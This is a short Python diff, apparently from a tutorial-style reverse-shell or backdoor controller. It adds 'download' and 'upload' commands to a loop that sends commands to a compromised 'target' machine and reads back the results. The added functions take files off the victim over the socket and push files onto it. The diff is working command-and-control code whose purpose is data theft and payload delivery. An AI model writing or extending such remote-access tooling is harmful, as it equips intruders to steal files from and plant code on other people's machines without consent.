@@ -19,10 +19,32 @@ def target_communic():
             pass 
         elif command == 'clear':
             os.system('clear')
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         else:
             # receives the response from the target when running our command
             result = reliable_receiv()
             print(result)
+
+def download_file(filename):
+    f = open(filename, 'wb')
+    # so that our program does not crash
+    chunk = target.recv(1024)
+    target.settimeout(1)
+    while chunk: 
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+def upload_file(filename): 
+    f = open(filename, 'rb')
+    target.send(f.read())
 
 def reliable_send(data):
     # data is our command and parses it to json
